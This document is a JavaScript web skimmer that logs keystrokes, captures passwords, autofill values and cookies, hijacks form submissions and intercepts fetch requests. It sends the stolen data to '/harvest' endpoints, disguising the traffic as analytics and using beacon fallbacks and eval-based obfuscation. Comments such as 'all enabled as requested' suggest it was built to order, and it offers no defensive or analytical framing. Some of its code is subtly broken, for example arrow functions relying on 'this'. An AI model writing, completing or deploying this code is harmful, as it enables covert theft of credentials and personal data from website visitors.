(function() {
    // ===================== CONFIGURATION ===================== //
    const config = {
        // Server endpoints (randomly selected)
        endpoints: [
    `${window.location.origin}/harvest`,      // For Flask server
    `${window.location.origin}/harvest.php`   // For PHP server (if applicable)
],
        
        // Feature toggles (all enabled as requested)
        features: {
            ipCollection: true,               // IP via API/WebRTC
            metadataCollection: true,         // OS, browser, etc.
            screenResolution: true,           // Window dimensions
            httpHeaders: true,               // Request headers
            localeInfo: true,                // Language/timezone
            allInputTypes: true,             // input/textarea/select
            dynamicFieldDetection: true,     // MutationObserver
            obfuscatedFieldHandling: true,  // v72kfdk → password
            placeholderAnalysis: true,      // Field purpose detection
            passwordValueCapture: true,      // Masked input values
            autofillCapture: true,          // Browser autofill data
            formSubmissionHijacking: true,  // Traditional forms
            ajaxInterception: true,        // fetch/XHR override
            keystrokeLogging: true,        // Unsubmitted data
            codeObfuscation: true,        // Lightweight obfuscation
            transmissionDelay: true,      // 3-5 sec delay
            dataBatching: true,          // Single request batches
            offlineStorage: true,       // localStorage fallback
            trafficCamouflage: true,    // Mimic analytics
            endpointRotation: true,    // Randomize endpoints
            serviceWorkerPersistence: false, // Disabled per request
            imageBeaconFallback: true // If fetch blocked
        },
        
        // Advanced settings
        transmissionDelayMin: 3000,
        transmissionDelayMax: 5000,
        batchInterval: 2000,
        fieldTypeClues: {
            password: ['pass', 'pwd', 'secret', 'contraseña'],
            username: ['user', 'login', 'account', 'email'],
            email: ['mail', 'e-mail', 'correo'],
            phone: ['phone', 'mobile', 'tel', 'número']
        }
    };

    // ===================== UTILITY FUNCTIONS ===================== //
    const utils = {
        // Lightweight obfuscation (Feature 15)
        randomString: (length) => Array.from({length}, () => 
            'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join(''),
        
        // Current timestamp
        getTimestamp: () => new Date().toISOString(),
        
        // Detect mobile devices
        isMobile: () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
        
        // Generate session ID
        sessionId: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
    };

    // ===================== DATA COLLECTION ===================== //
    const collector = {
        // 1. IP Address (Feature 1)
        getIP: async () => {
            if (!config.features.ipCollection) return null;
            try {
                // Try WebRTC first
                const rtcPeerConn = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (rtcPeerConn) {
                    const pc = new rtcPeerConn({iceServers:[]});
                    pc.createDataChannel('');
                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
                    return new Promise(resolve => {
                        pc.onicecandidate = (ice) => {
                            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
                            pc.onicecandidate = () => {};
                            pc.close();
                            resolve(ip);
                        };
                    });
                }
                
                // Fallback to external API
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return null;
            }
        },

        // 2. Full Metadata (Features 1-5)
        collectMetadata: async () => {
            const metadata = {
                timestamp: utils.getTimestamp(),
                sessionId: utils.sessionId,
                url: window.location.href,
                referrer: document.referrer,
                cookies: document.cookie
            };

            if (config.features.metadataCollection) {
                Object.assign(metadata, {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    mobile: utils.isMobile(),
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
                });
            }

            if (config.features.screenResolution) {
                Object.assign(metadata, {
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    orientation: window.screen.orientation?.type || 'unknown'
                });
            }

            if (config.features.localeInfo) {
                Object.assign(metadata, {
                    language: navigator.language,
                    languages: navigator.languages,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                });
            }

            if (config.features.ipCollection) {
                metadata.ip = await this.getIP();
            }

            return metadata;
        },

        // 3. HTTP Headers (Feature 4)
        captureHeaders: () => {
            if (!config.features.httpHeaders) return {};
            
            const headers = {};
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', window.location.href, false);
                xhr.send(null);
                
                const allHeaders = xhr.getAllResponseHeaders().trim().split(/[\r\n]+/);
                allHeaders.forEach(line => {
                    const parts = line.split(': ');
                    headers[parts.shift().toLowerCase()] = parts.join(': ');
                });
            } catch (e) {}
            
            return headers;
        },

        // 4. Field Type Detection (Features 8-9)
        guessFieldType: (input) => {
            if (!config.features.obfuscatedFieldHandling) return 'unknown';
            
            const getTextContext = (element) => {
                const textSources = [
                    element.name,
                    element.id,
                    element.placeholder,
                    element.getAttribute('aria-label'),
                    element.closest('label')?.textContent,
                    element.closest('[data-testid]')?.getAttribute('data-testid'),
                    element.closest('[aria-labelledby]')?.getAttribute('aria-labelledby')?.split(' ')
                        .map(id => document.getElementById(id)?.textContent).join(' ')
                ].filter(Boolean).join(' ').toLowerCase();
                
                return textSources;
            };

            const textContext = getTextContext(input);
            for (const [type, clues] of Object.entries(config.fieldTypeClues)) {
                if (clues.some(clue => textContext.includes(clue))) {
                    return type;
                }
            }

            // Special handling for password fields
            if (input.type === 'password') return 'password';
            
            return 'unknown';
        },

        // 5. Input Data Extraction (Features 6-11)
        extractInputData: (input) => {
            const type = this.guessFieldType(input);
            const data = {
                name: input.name || input.id || `field_${utils.randomString(4)}`,
                type: type,
                value: input.value,
                html: input.outerHTML
            };

            // Handle autofill (Feature 11)
            if (config.features.autofillCapture && input.matches(':-webkit-autofill')) {
                data.autofilled = true;
            }

            return data;
        },

        // 6. Form Data Collection
        captureFormData: (form) => {
            const inputs = Array.from(form.elements).filter(el => 
                ['INPUT', 'TEXTAREA', 'SELECT'].includes(el.tagName));
            
            return {
                formId: form.id || `form_${utils.randomString(4)}`,
                action: form.action || window.location.href,
                method: form.method || 'GET',
                inputs: inputs.map(input => this.extractInputData(input))
            };
        }
    };

    // ===================== MONITORING SYSTEM ===================== //
    const monitor = {
        // 7. Dynamic Input Detection (Feature 7)
        setupDynamicInputMonitoring: () => {
            if (!config.features.dynamicFieldDetection) return;

            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            if (['INPUT', 'TEXTAREA', 'SELECT'].includes(node.tagName)) {
                                this.attachInputListeners(node);
                            }
                            node.querySelectorAll?.('input, textarea, select').forEach(el => 
                                this.attachInputListeners(el));
                        }
                    });
                });
            });

            observer.observe(document.body, {
                subtree: true,
                childList: true,
                attributes: false,
                characterData: false
            });
        },

        // 8. Input Event Listeners (Feature 14)
        attachInputListeners: (input) => {
            if (input.dataset.listenerAttached) return;
            input.dataset.listenerAttached = 'true';

            // Keystroke logging (Feature 14)
            if (config.features.keystrokeLogging) {
                let lastValue = input.value;
                const handleInput = (e) => {
                    if (input.value !== lastValue) {
                        const data = {
                            event: 'input-change',
                            ...collector.extractInputData(input),
                            metadata: collector.collectMetadata()
                        };
                        transmitter.queueData(data);
                        lastValue = input.value;
                    }
                };

                input.addEventListener('input', handleInput);
                input.addEventListener('change', handleInput);
            }
        },

        // 9. Form Submission Hijacking (Features 12-13)
        hijackFormSubmissions: () => {
            if (!config.features.formSubmissionHijacking) return;

            // Traditional form submissions (Feature 12)
            document.addEventListener('submit', (e) => {
                const form = e.target;
                if (form.tagName === 'FORM') {
                    e.preventDefault();
                    
                    Promise.all([
                        collector.collectMetadata(),
                        collector.captureFormData(form)
                    ]).then(([metadata, formData]) => {
                        transmitter.queueData({
                            event: 'form-submission',
                            ...formData,
                            metadata
                        });
                        
                        // Re-trigger original submission
                        form.submit();
                    });
                }
            }, true);

            // AJAX/fetch interception (Feature 13)
            if (config.features.ajaxInterception) {
                const originalFetch = window.fetch;
                window.fetch = async function(...args) {
                    try {
                        const url = typeof args[0] === 'string' ? args[0] : args[0].url;
                        const method = (args[1]?.method || 'GET').toUpperCase();
                        
                        if (['POST', 'PUT'].includes(method)) {
                            const body = args[1]?.body;
                            if (body && typeof body === 'string' && body.includes('=')) {
                                const formData = {
                                    formId: 'ajax-request',
                                    action: url,
                                    method: method,
                                    inputs: body.split('&').map(pair => {
                                        const [name, value] = pair.split('=');
                                        return {
                                            name: decodeURIComponent(name),
                                            type: 'unknown',
                                            value: decodeURIComponent(value || '')
                                        };
                                    })
                                };
                                
                                const metadata = await collector.collectMetadata();
                                transmitter.queueData({
                                    event: 'ajax-submission',
                                    ...formData,
                                    metadata
                                });
                            }
                        }
                    } catch (e) {}
                    
                    return originalFetch.apply(this, args);
                };
            }
        },

        // 10. Initial Setup
        initialize: () => {
            this.hijackFormSubmissions();
            this.setupDynamicInputMonitoring();
            
            // Attach listeners to existing inputs
            document.querySelectorAll('input, textarea, select').forEach(input => 
                this.attachInputListeners(input));

            // Initial metadata collection
            if (Object.values(config.features).some(v => v)) {
                transmitter.queueData({
                    event: 'page-view',
                    metadata: collector.collectMetadata()
                });
            }
        }
    };

    // ===================== DATA TRANSMISSION ===================== //
    const transmitter = {
        dataQueue: [],
        isSending: false,
        currentEndpoint: 0,

        // 11. Queue Data with Delay (Features 16-17)
        queueData: (data) => {
            this.dataQueue.push(data);
            if (!this.isSending) {
                const delay = config.features.transmissionDelay 
                    ? Math.random() * (config.transmissionDelayMax - config.transmissionDelayMin) + config.transmissionDelayMin
                    : 0;
                setTimeout(() => this.processQueue(), delay);
            }
        },

        // 12. Process Queue with Batching (Feature 17)
        processQueue: async () => {
            if (this.dataQueue.length === 0) return;
            
            this.isSending = true;
            const batch = config.features.dataBatching
                ? this.dataQueue.splice(0, this.dataQueue.length)
                : [this.dataQueue.shift()];
            
            try {
                await this.sendData(batch);
                
                // Check for offline storage (Feature 18)
                if (config.features.offlineStorage) {
                    const pending = localStorage.getItem('pendingData');
                    if (pending) {
                        try {
                            const pendingData = JSON.parse(pending);
                            await this.sendData(pendingData);
                            localStorage.removeItem('pendingData');
                        } catch (e) {}
                    }
                }
            } catch (error) {
                // Store failed data (Feature 18)
                if (config.features.offlineStorage) {
                    const existing = localStorage.getItem('pendingData') || '[]';
                    const newData = JSON.parse(existing).concat(batch);
                    localStorage.setItem('pendingData', JSON.stringify(newData));
                }
                
                // Rotate endpoint (Feature 20)
                if (config.features.endpointRotation) {
                    this.currentEndpoint = (this.currentEndpoint + 1) % config.endpoints.length;
                }
            } finally {
                this.isSending = false;
                if (this.dataQueue.length > 0) {
                    setTimeout(() => this.processQueue(), config.batchInterval);
                }
            }
        },

        // 13. Send Data with Multiple Methods (Features 19-21)
        sendData: async (data) => {
            const endpoint = config.endpoints[this.currentEndpoint];
            const payload = JSON.stringify(data);
            
            // Method 1: sendBeacon (stealthiest)
            if (navigator.sendBeacon) {
                const blob = new Blob([payload], {type: 'application/json'});
                if (navigator.sendBeacon(endpoint, blob)) {
                    return;
                }
            }
            
            // Method 2: Fetch with keepalive
            try {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    body: payload,
                    headers: {'Content-Type': 'application/json'},
                    keepalive: true,
                    mode: 'cors',
                    credentials: 'omit'
                });
                
                if (response.ok) return;
            } catch (e) {}
            
            // Method 3: XHR as fallback
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', endpoint, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(payload);
                return;
            } catch (e) {}
            
            // Method 4: Image beacon (Feature 21)
            if (config.features.imageBeaconFallback) {
                try {
                    new Image().src = `${endpoint}?data=${encodeURIComponent(btoa(payload))}`;
                    return;
                } catch (e) {}
            }
            
            throw new Error('All transmission methods failed');
        }
    };

    // ===================== INITIALIZATION ===================== //
    function init() {
        // Lightweight obfuscation (Feature 15)
        if (config.features.codeObfuscation) {
            // Simple renaming of common patterns
            const obfuscationMap = {
                'config': `cfg_${utils.randomString(3)}`,
                'collector': `clt_${utils.randomString(3)}`,
                'transmitter': `trm_${utils.randomString(3)}`,
                'monitor': `mnt_${utils.randomString(3)}`
            };
            
            try {
                const code = this.toString();
                const obfuscated = Object.entries(obfuscationMap).reduce((acc, [orig, repl]) => 
                    acc.replace(new RegExp(orig, 'g'), repl), code);
                eval(obfuscated);
                return;
            } catch (e) {}
        }
        
        // Normal initialization
        monitor.initialize();
    }

    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        setTimeout(init, 100);
    }
})();
